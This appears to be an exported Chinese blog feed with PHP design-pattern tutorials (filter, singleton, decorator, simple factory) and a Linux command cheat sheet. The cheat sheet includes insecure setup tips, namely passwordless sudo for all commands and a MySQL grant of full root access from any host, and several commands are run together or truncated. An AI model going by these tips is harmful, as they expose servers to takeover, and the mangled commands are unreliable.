<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"../include.php"</span>;</span><br><span class="line"></span><br><span class="line">$users = [];</span><br><span class="line"></span><br><span class="line">$users[] = <span class="keyword">new</span> \App\Filter\User(<span class="number">1</span>, <span class="string">"1"</span>, <span class="number">25</span>, <span class="string">"男"</span>);</span><br><span class="line">$users[] = <span class="keyword">new</span> \App\Filter\User(<span class="number">2</span>, <span class="string">"2"</span>, <span class="number">35</span>, <span class="string">"男"</span>);</span><br><span class="line">$users[] = <span class="keyword">new</span> \App\Filter\User(<span class="number">3</span>, <span class="string">"3"</span>, <span class="number">27</span>, <span class="string">"女"</span>);</span><br><span class="line">$users[] = <span class="keyword">new</span> \App\Filter\User(<span class="number">4</span>, <span class="string">"4"</span>, <span class="number">21</span>, <span class="string">"男"</span>);</span><br><span class="line">$users[] = <span class="keyword">new</span> \App\Filter\User(<span class="number">5</span>, <span class="string">"5"</span>, <span class="number">24</span>, <span class="string">"女"</span>);</span><br><span class="line"></span><br><span class="line">$ageFilter = <span class="keyword">new</span> \App\Filter\AgeFilter();</span><br><span class="line">$result    = $ageFilter-&gt;filter($users);</span><br><span class="line"></span><br><span class="line">$maleFilter = <span class="keyword">new</span> \App\Filter\MaleFilter();</span><br><span class="line">$result     = $maleFilter-&gt;filter($result);</span><br><span class="line"></span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure>

<p>这个例子比较简单，也不算太恰当，实际应用中，过滤器模式很多地方都用，比如PHP自带的就有一个Filter类,有一些类似 filter_input 这样的方法可以用来过滤变量。在laravel框架里面利用管道过滤器模式实现了middleware(中间件)，非常方便，在实现功能的同时增加了项目的可维护性。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP设计模式之单例模式</title>
    <url>/2016/coding/php/php-designpattern-single.html</url>
    <content><![CDATA[<blockquote>
<blockquote>
<p>单例模式（Singleton Pattern）是最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。<br> 这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。</p>
</blockquote>
</blockquote>
<hr>
<p>最大好处是减少了内存的开销，尤其是频繁的创建和销毁实例，而且可以避免对一些资源的多重占用，对于PHP Web应用来说，虽然每次请求结束之后所有对象都会被销毁，但是依然有意义。</p>
<p>举个例子，一个请求有好几个操作，必须调用好几个对象的不同方法，刚好在这个几个方法里面都会用到redis，如果不使用单例模式，那么在每个对象里面都会重新实例化一次redis，浪费内存和时间，建立网络连接也耗时，但是如果使用单例，则只需要在第一次调用redis的使用实例化对象。</p>
<a id="more"></a>

<p>这里就拿Redis举例，私有化构造方法和clone方法，然后提供一个静态方法用于实例化对象：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Single</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redis</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Connect to redis...\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getRedis</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">static</span>::$instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">static</span>::$instance = <span class="keyword">new</span> <span class="keyword">static</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::$instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello World\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用的时候：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">"../include.php"</span>;</span><br><span class="line"></span><br><span class="line">$redis = \App\Single\Redis::getRedis();</span><br><span class="line"></span><br><span class="line">$redis-&gt;showMsg();</span><br><span class="line"></span><br><span class="line">$redis = \App\Single\Redis::getRedis();</span><br><span class="line"></span><br><span class="line">$redis-&gt;showMsg();</span><br><span class="line"></span><br><span class="line">$redis = \App\Single\Redis::getRedis();</span><br><span class="line"></span><br><span class="line">$redis = \App\Single\Redis::getRedis();</span><br><span class="line"></span><br><span class="line">$redis-&gt;showMsg();</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Connect to redis...</span><br><span class="line">Hello World</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure>

<p>从结果可以看到，无论你调用几次，构造方法只会只会执行一次, 说明redis类只实例化了一次。在Java里面可能还有饿汉式和懒汉式之分，<br>不过在PHP里面由于语言特性限制，实际上只有一种模式，就是上面的饿汉式，而且PHP也不存在多线程问题（原生不支持多线程）！</p>
<p>有个小坑，需要说一下，PHP有多进程的扩展pcntl 和 多线程扩展pthread，如果你使用了这些扩展的话，最好不要使用单例模式，这会带来争用问题，<br>产生很多意想不到的结果，而PHP又没提供类似Java那样的synchronized关键字用于加锁，所以咯，最简单的方法就是在每个进程\线程里面单独实例化。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP设计模式之装饰器模式</title>
    <url>/2016/coding/php/php-designpattern-decorator.html</url>
    <content><![CDATA[<h1 id="装饰器模式"><a href="#装饰器模式" class="headerlink" title="装饰器模式"></a>装饰器模式</h1><blockquote>
<p>动态地给一个对象添加一些额外的职责，就增加功能来说，装饰器模式比生成子类更为灵活；它允许向一个现有的对象添加新的功能，同时又不改变其结构。</p>
</blockquote>
<p>这个模式算是比较容易理解，它主要解决类的功能扩展问题，当我们需要给一个类增加功能时候，我们可以选直接修改当前类，也可以继承当前类然后增加新方法。但是装饰模式更强调的是动态扩展类的功能，而不是直接修改类的功能。</p>
<p>举个例子：大家早餐买煎饼果子的时候，可以选择加鸡蛋、辣条、火腿肠，但是也可以选择什么都不加。</p>
<a id="more"></a>

<h2 id="1-煎饼果子接口类："><a href="#1-煎饼果子接口类：" class="headerlink" title="1.煎饼果子接口类："></a>1.煎饼果子接口类：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Decorator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IPancake</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">price</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cook</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-具体的煎饼生产类："><a href="#2-具体的煎饼生产类：" class="headerlink" title="2.具体的煎饼生产类："></a>2.具体的煎饼生产类：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Decorator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pancake</span> <span class="keyword">implements</span> <span class="title">IPancake</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">price</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cook</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"制作煎饼...\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-煎饼装饰抽象类："><a href="#3-煎饼装饰抽象类：" class="headerlink" title="3.煎饼装饰抽象类："></a>3.煎饼装饰抽象类：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Decorator</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">PancakeDecorator</span> <span class="keyword">implements</span> <span class="title">IPancake</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $pancake;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(IPancake $pancake)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pancake = $pancake;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cook</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pancake-&gt;cook();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-具体装饰类一："><a href="#4-具体装饰类一：" class="headerlink" title="4.具体装饰类一："></a>4.具体装饰类一：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Decorator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EgeDecorator</span> <span class="keyword">extends</span> <span class="title">PancakeDecorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(IPancake $pancake)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($pancake);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cook</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"加了一个鸡蛋...\n"</span>;</span><br><span class="line">        <span class="keyword">parent</span>::cook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">price</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-具体装饰类二："><a href="#5-具体装饰类二：" class="headerlink" title="5.具体装饰类二："></a>5.具体装饰类二：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Decorator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTCDecorator</span> <span class="keyword">extends</span> <span class="title">PancakeDecorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(IPancake $pancake)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($pancake);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cook</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"加了一根火腿肠...\n"</span>;</span><br><span class="line">        <span class="keyword">parent</span>::cook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">price</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-使用结果："><a href="#6-使用结果：" class="headerlink" title="6.使用结果："></a>6.使用结果：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"../include.php"</span>;</span><br><span class="line"></span><br><span class="line">$cake = <span class="keyword">new</span> \App\Decorator\Pancake();</span><br><span class="line">$cake-&gt;cook();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-----------------------------------------\n"</span>;</span><br><span class="line"></span><br><span class="line">$egeCake = <span class="keyword">new</span> \App\Decorator\EgeDecorator($cake);</span><br><span class="line">$egeCake-&gt;cook();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-----------------------------------------\n"</span>;</span><br><span class="line"></span><br><span class="line">$htcCake = <span class="keyword">new</span> \App\Decorator\HTCDecorator($cake);</span><br><span class="line">$htcCake-&gt;cook();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-----------------------------------------\n"</span>;</span><br><span class="line"></span><br><span class="line">$htcCake = <span class="keyword">new</span> \App\Decorator\HTCDecorator($egeCake);</span><br><span class="line">$htcCake-&gt;cook();</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果如下：</span></span><br><span class="line"></span><br><span class="line">制作煎饼...</span><br><span class="line">-----------------------------------------</span><br><span class="line">加了一个鸡蛋...</span><br><span class="line">制作煎饼...</span><br><span class="line">-----------------------------------------</span><br><span class="line">加了一根火腿肠...</span><br><span class="line">制作煎饼...</span><br><span class="line">-----------------------------------------</span><br><span class="line">加了一根火腿肠...</span><br><span class="line">加了一个鸡蛋...</span><br><span class="line">制作煎饼...</span><br></pre></td></tr></table></figure>

<p>从这里看出，使用装饰模式，我们可以非常方便的动态扩展当前类的功能，可以随意组合装饰类实现类功能扩展！</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux常用命令和工具</title>
    <url>/2016/linux/linux-command-usage.html</url>
    <content><![CDATA[<p>1.备份命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar cvpzf backup.tgz --exclude&#x3D;&#x2F;proc --exclude&#x3D;&#x2F;lost+found --exclude&#x3D;&#x2F;root&#x2F;backup.tgz --exclude&#x3D;&#x2F;mnt --exclude&#x3D;&#x2F;sys --exclude&#x3D;&#x2F;media  &#x2F;</span><br></pre></td></tr></table></figure>

<p>2.查看目录大小：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">du -sh</span><br><span class="line">du -h --max-depth 1</span><br><span class="line">du -Sh</span><br></pre></td></tr></table></figure>

<p>3.返回上次命令行位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd -</span><br></pre></td></tr></table></figure>

<p>4.ssh秘钥免密登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.ssh-keygen -t rsa #创建公钥</span><br><span class="line">2.scp &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub root@45.32.30.198:~&#x2F;.ssh</span><br><span class="line">3.cat id_rsa.pub &gt;&gt; authorized_keys</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>5.端口占用情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -anp</span><br></pre></td></tr></table></figure>

<p>6.格式化U盘</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line">fdisk &#x2F;dev&#x2F;sdc</span><br><span class="line">mkfs -t ntfs &#x2F;dev&#x2F;sdc1</span><br></pre></td></tr></table></figure>

<p>7.后台运行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nohup ping 192.168.2.1 &gt;&gt; no.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>8.crontab定时任务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">minute： 表示分钟，可以是从0到59之间的任何整数</span><br><span class="line">hour：表示小时，可以是从0到23之间的任何整数</span><br><span class="line">day：表示日期，可以是从1到31之间的任何整数</span><br><span class="line">month：表示月份，可以是从1到12之间的任何整数</span><br><span class="line">week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日</span><br><span class="line">command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。</span><br><span class="line">*&#x2F;5 * * * * command     #每5分钟执行一次</span><br><span class="line">* * * * * co</span><br></pre></td></tr></table></figure>
<p>9.语言包问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export LANGUAGE&#x3D;zh_CN.UTF-8</span><br><span class="line">export LANG&#x3D;zh_CN.UTF-8</span><br><span class="line">export LC_ALL&#x3D;zh_CN.UTF-8</span><br><span class="line">sudo locale-gen zh_CN.UTF-8</span><br><span class="line">vim &#x2F;etc&#x2F;default&#x2F;locale</span><br><span class="line">LANG&#x3D;&quot;en_US.UTF-8&quot;</span><br><span class="line">LANGUAGE&#x3D;&quot;en_US.UTF-8&quot;</span><br><span class="line">LC_ALL&#x3D;&quot;en_US.UTF-8&quot;</span><br><span class="line">apt-get install language-pack-en-base  </span><br><span class="line">vagrant plugin install vagrant-vbguest</span><br></pre></td></tr></table></figure>

<p>10.测速软件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python-pippip install speedtest-clispeedtest-cli</span><br></pre></td></tr></table></figure>
<p>11.docker</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it --add-host localmysql:127.0.0.1 -p 192.168.0.109:8080:80  -v &#x2F;home&#x2F;jwang&#x2F;Documents&#x2F;work&#x2F;ycg:&#x2F;var&#x2F;www&#x2F;ycg ubuntu:14.10</span><br></pre></td></tr></table></figure>

<p>12.设置ubuntu系统cpu调度器为performance</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;init.d&#x2F;cpufrequtilsGOVERNOR&#x3D;&quot;performance&quot;</span><br></pre></td></tr></table></figure>

<p>13.sudo不用输密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">my-username ALL&#x3D;(ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
<p>14.切换PHP版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --query php</span><br><span class="line">sudo update-alternatives --set php &#x2F;usr&#x2F;bin&#x2F;php5.6</span><br></pre></td></tr></table></figure>

<p>15.mysql开启远程访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.bind_address 注释掉</span><br><span class="line">2.grant all on *.* to root@&#39;%&#39; identified by &#39;password&#39;;</span><br></pre></td></tr></table></figure>

<p>16.unzip解压中文乱码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unzip -O CP936 xxx.zip (用GBK, GB18030也可以)</span><br></pre></td></tr></table></figure>

<p>17.开机自启 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-rc.d   apache2 defaults </span><br><span class="line">sudo update-rc.d -f apache2 remove</span><br></pre></td></tr></table></figure>
<p>18.时区问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hwclock -r  #查看时钟</span><br><span class="line">date  #查看时间</span><br><span class="line">tzselect #选择时区</span><br><span class="line">TZ&#x3D;&#39;Asia&#x2F;Shanghai&#39;; export TZ #设置时区</span><br></pre></td></tr></table></figure>
<p>19.流量监控</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:nilarimogard&#x2F;webupd8</span><br><span class="line">sudo apt-get install indicator-netspeed</span><br></pre></td></tr></table></figure>
<p>20.设置CPU governor</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install cpufrequtils</span><br><span class="line">sudo cpufreq-set -r -g performance</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line">21.合并音视频</span><br></pre></td></tr></table></figure>
<p>sudo ffmpeg -i out.mp4 -i sound.mp3 -vcodec copy -acodec copy out.mp4</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22.查找kill进程</span><br></pre></td></tr></table></figure>
<p>sudo ps -axu|grep QQ |awk -F” “ ‘{print $2}’|xargs kill -9</p>
<pre><code></code></pre>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP设计模式之简单工厂模式</title>
    <url>/2016/coding/php/php-designpattern-factory.html</url>
    <content><![CDATA[<blockquote>
<p>这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。</p>
</blockquote>
<hr>
<p>工厂模式其实就是用来创建对象的，对象是什么的，当然是类的实例，在学习设计模式之前，请先回忆一下面向对象编程，牢记面向对象三大特性：封装，继承，多态！<br>很多语言并不是完全面向对象的，比如PHP，JS等脚本语言，但这并无妨碍我们去学习其设计思想，但是我们必须从面向对象的思路去理解这种设计！</p>
<p>在完全面向对象的世界里面，首先必须有类，然后才有对象，对象有属性和方法，在程序运行的时候我们需要先创建一个类，然后使用 <strong>new</strong> 去实例化一个类得到一个对象，然后去调用这个类的相关属性活方法。</p>
<a id="more"></a>

<p>举个最简单的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLog</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">($param)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Log $param to $this-&gt;file!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$logger = <span class="keyword">new</span> FileLog();</span><br><span class="line">$logger-&gt;file = <span class="string">"/data/log.log"</span>;</span><br><span class="line">$logger-&gt;log(<span class="string">"something"</span>);</span><br></pre></td></tr></table></figure>
<p>大部分时候我们这么用就可以了，十分简单方便，但是使用建造中模式我们可以更灵活的创建对象，比如说我们系统里面支持2种日志记录方式，<br>一个是文件日志，一个是mongo日志，他们都有一个共同的功能那就是记录日志！可以采用如下设计：</p>
<p>我们先定义一个接口Log.php :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">SimpleFactory</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">(string $param)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后创建2个类实现这个接口：</p>
<p>FileLog.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">SimpleFactory</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLog</span> <span class="keyword">implements</span> <span class="title">Log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">(string $param)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Log $param to File\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>MongoLog.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">SimpleFactory</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MongoLog</span> <span class="keyword">implements</span> <span class="title">Log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">(string $param)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Log $param to Mongo\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这时候我们需要一个工厂去生产这个日志对象 LogFactory.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">SimpleFactory</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> FILE_LOG = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> MONGO_LOG = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getLogger</span><span class="params">(string $logType)</span>: <span class="title">Log</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($logType == <span class="keyword">self</span>::MONGO_LOG) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> MongoLog();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FileLog();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后，新建一个demo.php验证是否可以使用，这里我使用了 <strong>spl_autoload_register</strong> 解决了文件加载问题:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">"../include.php"</span>;</span><br><span class="line"></span><br><span class="line">$factory = <span class="keyword">new</span> \App\SimpleFactory\LogFactory();</span><br><span class="line"></span><br><span class="line">$fileLog = $factory-&gt;getLogger($factory::FILE_LOG);</span><br><span class="line">$fileLog-&gt;log(<span class="string">"something"</span>);</span><br><span class="line"></span><br><span class="line">$mongoLog = $factory-&gt;getLogger($factory::MONGO_LOG);</span><br><span class="line">$mongoLog-&gt;log(<span class="string">"something"</span>);</span><br></pre></td></tr></table></figure>
<p>这种设计至少有一个好处可以灵活的切换日志类型，而且对于调用者来说他只需传一个参数即可，屏蔽了创建过程中的细节，实际应用中我们可以在创建对象的过程中做一些初始化工作！</p>
<p>接下来我们会讲一下工厂方法模式，这是简单工厂模式的改进版！</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>闲谈PHP面向对象编程</title>
    <url>/2016/coding/php/php-oop-thinking.html</url>
    <content><![CDATA[<p>关于面向过程和面向对象编程之间的区别这里不多说,简单看了一个例子,如何解决把大象装进冰箱这个问题?</p>
<h3 id="面向过程方案"><a href="#面向过程方案" class="headerlink" title="面向过程方案:"></a>面向过程方案:</h3><p>第一步.打开冰箱</p>
<p>第二步.把大象放进冰箱</p>
<p>第三步,关上冰箱</p>
<p>这个方案看上去没什么毛病,简单明了,当然第二步可以拆分的更细,拆成更多小步骤!用代码简单演示如下:</p>
